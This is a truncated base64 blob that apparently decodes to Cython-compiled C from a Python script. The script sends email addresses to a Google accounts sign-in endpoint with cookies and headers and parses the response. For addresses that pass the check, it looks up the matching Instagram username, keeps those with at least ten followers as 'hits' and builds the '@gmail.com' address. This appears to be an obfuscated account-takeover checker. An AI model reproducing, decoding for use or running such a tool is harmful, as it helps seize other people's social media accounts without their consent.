Ch1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE0NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9UTCwgX19weXhfdl90bCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNDQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19weXhfdl9wYXJhbXMgPSAoKFB5T2JqZWN0KilfX3B5eF90XzYpO1xuICAgICAgX19weXhfdF82ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl90bCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE0NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl9lbWFpbCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCAxNDUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgX19weXhfdF8yM1swXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfY29udGludWVfaHR0cHNfM0FfMkZfMkZtYWlsX2dvb2c7XG4gICAgICBfX3B5eF90XzIzWzFdID0gX19weXhfdF82O1xuICAgICAgX19weXhfdF8yM1syXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjJfMkNfMjI7XG4gICAgICBfX3B5eF90XzIzWzNdID0gX19weXhfdF8xMjtcbiAgICAgIF9fcHl4X3RfMjNbNF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzIyXzJDMF8yQzBfMkMxXzJDbnVsbF8yQzBfMkM1MTY7XG4gICAgICBfX3B5eF90XzExID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF8yMywgNSwgMTE5ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF82KSArIDkgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzEyKSArIDM2MCwgMTI3IHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNikgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xMikpO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDE0NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICBfX3B5eF92X2RhdGEgPSAoKFB5T2JqZWN0KilfX3B5eF90XzExKTtcbiAgICAgIF9fcHl4X3RfMTEgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMTIgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE0NiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcG9zdCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE0NiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMTMgPSAxO1xuICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNSkpKSB7XG4gICAgICAgIF9fcHl4X3RfMTIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpO1xuICAgICAgICBhc3NlcnQoX19weXhfdF8xMik7XG4gICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF81KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzUsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgfVxuICAgICAgI2VuZGlmXG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyA0IDogMCldID0ge19fcHl4X3RfMTIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9fX3NpZ25fMn07XG4gICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoNCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE0NiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wYXJhbXMsIF9fcHl4X3ZfcGFyYW1zLCBfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzKzIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMTQ2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29va2llcywgX19weXhfdl9jb29raWVzLCBfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzKzIsIDEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTQ2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfdl9oZWFkZXJzLCBfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzKzIsIDIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTQ2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGF0YSwgX19weXhfdl9kYXRhLCBfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzKzIsIDMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTQ2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19weXhfdF8xMSA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcigoUHlPYmplY3QqKV9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDItX19weXhfdF8xMykgfCAoX19weXhfdF8xMypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpLCBfX3B5eF90XzYpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMTQ2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgfVxuICAgICAgX19weXhfdl9yZXNwb25zZSA9IF9fcHl4X3RfMTE7XG4gICAgICBfX3B5eF90XzExID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3Jlc3BvbnNlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGV4dCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxNDksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfVW5pY29kZShfX3B5eF90XzExKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTQ5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgIF9fcHl4X3RfNCA9IChfX1B5eF9QeVVuaWNvZGVfQ29udGFpbnNURihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2dmX3Vhcl8xLCBfX3B5eF90XzUsIFB5X0VRKSk7IGlmICh1bmxpa2VseSgoX19weXhfdF80IDwgMCkpKSBfX1BZWF9FUlIoMCwgMTQ5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgaWYgKF9fcHl4X3RfNCkge1xuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF90XzQgPSAoX19QeXhfUHlTZXF1ZW5jZV9Db250YWluc1RGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzcsIF9fcHl4X3Zfb3JpZ2luYWxfZW1haWwsIFB5X0VRKSk7IGlmICh1bmxpa2VseSgoX19weXhfdF80IDwgMCkpKSBfX1BZWF9FUlIoMCwgMTUxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgaWYgKF9fcHl4X3RfNCkge1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF82ID0gX19weXhfdl9vcmlnaW5hbF9lbWFpbDtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTtcbiAgICAgICAgICBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X183fTtcbiAgICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGxpdCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDItX19weXhfdF8xMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxNTAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgIH1cblxuICAgICAgICAgIFxuICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X0dldEl0ZW1JbnQoX19weXhfdF8xMSwgMCwgbG9uZywgMSwgX19QeXhfUHlMb25nX0Zyb21fbG9uZywgMCwgMCwgMSwgMSwgX19QeXhfUmVmZXJlbmNlU2hhcmluZ19Pd25TdHJvbmdSZWZlcmVuY2UpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxNTEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgICAgX19weXhfdF81ID0gX19weXhfdF82O1xuICAgICAgICAgIF9fcHl4X3RfNiA9IDA7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3Zfb3JpZ2luYWxfZW1haWwpO1xuICAgICAgICAgIF9fcHl4X3RfNSA9IF9fcHl4X3Zfb3JpZ2luYWxfZW1haWw7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfdl91c2VybmFtZSA9IF9fcHl4X3RfNTtcbiAgICAgICAgX19weXhfdF81ID0gMDtcblxuICAgICAgICBcbiAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbmZvaW5zdGEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxNTIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgX19weXhfdF80ID0gKF9fUHl4X1B5U2VxdWVuY2VfQ29udGFpbnNURihfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF90XzUsIFB5X0VRKSk7IGlmICh1bmxpa2VseSgoX19weXhfdF80IDwgMCkpKSBfX1BZWF9FUlIoMCwgMTUyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgIGlmIChfX3B5eF90XzQpIHtcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5mb2luc3RhKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTU0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9HZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfdl91c2VybmFtZSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE1NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxNTQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs2XSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE1NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU51bWJlcl9JbnQoX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTUzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICBfX3B5eF92X2ZvbGxvd2VyX2NvdW50ID0gKChQeU9iamVjdCopX19weXhfdF81KTtcbiAgICAgICAgICBfX3B5eF90XzUgPSAwO1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF81ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl9mb2xsb3dlcl9jb3VudCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwLCBQeV9HRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTU1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF81KTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzQgPCAwKSkpIF9fUFlYX0VSUigwLCAxNTUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgIGlmIChfX3B5eF90XzQpIHtcblxuICAgICAgICAgICAgXG4gICAgICAgICAgICBfX3B5eF90XzYgPSBfX3B5eF92X3NlbGY7XG4gICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTtcbiAgICAgICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICAgICAge1xuICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGl0c307XG4gICAgICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luY3JlbWVudF9jb3VudGVyLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMi1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE1NiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgICAgICAgIFxuICAgICAgICAgICAgX19weXhfdF80ID0gKF9fUHl4X1B5U2VxdWVuY2VfQ29udGFpbnNURihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X183LCBfX3B5eF92X29yaWdpbmFsX2VtYWlsLCBQeV9ORSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfNCA8IDApKSkgX19QWVhfRVJSKDAsIDE1NywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICBpZiAoX19weXhfdF80KSB7XG5cbiAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgIF9fcHl4X3RfNSA9IFB5TnVtYmVyX0FkZChfX3B5eF92X29yaWdpbmFsX2VtYWlsLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2dtYWlsX2NvbSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE1OCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgICAgICBfX3B5eF92X29rID0gX19weXhfdF81O1xuICAgICAgICAgICAgICBfX3B5eF90XzUgPSAwO1xuXG4gICAgICAgICAgICAgIFxuICAgICAgICAgICAgICBfX3B5eF90XzYgPSBfX3B5eF92X29rO1xuICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTtcbiAgICAgICAgICAgICAgX19weXhfdF8xMyA9IDA7XG4gICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X183fTtcbiAgICAgICAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGxpdCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDItX19weXhfdF8xMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTU5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICBpZiAoKGxpa2VseShQeVR1cGxlX0NoZWNrRXhhY3QoX19weXhfdF81KSkpIHx8IChQeUxpc3RfQ2hlY2tFeGFjdChfX3B5eF90XzUpKSkge1xuICAgICAgICAgICAgICAgIFB5T2JqZWN0KiBzZXF1ZW5jZSA9IF9fcHl4X3RfNTtcbiAgICAgICAgICAgICAgICBQeV9zc2l6ZV90IHNpemUgPSBfX1B5eF9QeVNlcXVlbmNlX1NJWkUoc2VxdWVuY2UpO1xuICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShzaXplICE9IDIpKSB7XG4gICAgICAgICAgICAgICAgICBpZiAoc2l6ZSA+IDIpIF9fUHl4X1JhaXNlVG9vTWFueVZhbHVlc0Vycm9yKDIpO1xuICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoc2l6ZSA+PSAwKSBfX1B5eF9SYWlzZU5lZWRNb3JlVmFsdWVzRXJyb3Ioc2l6ZSk7XG4gICAgICAgICAgICAgICAgICBfX1BZWF9FUlIoMCwgMTU5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgICAgICAgICAgaWYgKGxpa2VseShQeVR1cGxlX0NoZWNrRXhhY3Qoc2VxdWVuY2UpKSkge1xuICAgICAgICAgICAgICAgICAgX19weXhfdF82ID0gUHlUdXBsZV9HRVRfSVRFTShzZXF1ZW5jZSwgMCk7XG4gICAgICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTtcbiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTEgPSBQeVR1cGxlX0dFVF9JVEVNKHNlcXVlbmNlLCAxKTtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzExKTtcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWZGYXN0KHNlcXVlbmNlLCAwLCBfX1B5eF9SZWZlcmVuY2VTaGFyaW5nX1NoYXJlZFJlZmVyZW5jZSk7XG4gICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxNTksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgICAgICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmRmFzdChzZXF1ZW5jZSwgMSwgX19QeXhfUmVmZXJlbmNlU2hhcmluZ19TaGFyZWRSZWZlcmVuY2UpO1xuICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDE1OSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAjZWxzZVxuICAgICAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShzZXF1ZW5jZSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE1OSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShzZXF1ZW5jZSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxNTksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTtcbiAgICAgICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICBQeV9zc2l6ZV90IGluZGV4ID0gLTE7XG4gICAgICAgICAgICAgICAgX19weXhfdF8xMiA9IFB5T2JqZWN0X0dldEl0ZXIoX19weXhfdF81KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDE1OSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgICAgICAgIF9fcHl4X3RfMjIgPSAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPyBQeUl0ZXJfTmV4dCA6IF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhfX3B5eF90XzEyKTtcbiAgICAgICAgICAgICAgICBpbmRleCA9IDA7IF9fcHl4X3RfNiA9IF9fcHl4X3RfMjIoX19weXhfdF8xMik7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgZ290byBfX3B5eF9MNTZfdW5wYWNraW5nX2ZhaWxlZDtcbiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgICAgICAgICBpbmRleCA9IDE7IF9fcHl4X3RfMTEgPSBfX3B5eF90XzIyKF9fcHl4X3RfMTIpOyBpZiAodW5saWtlbHko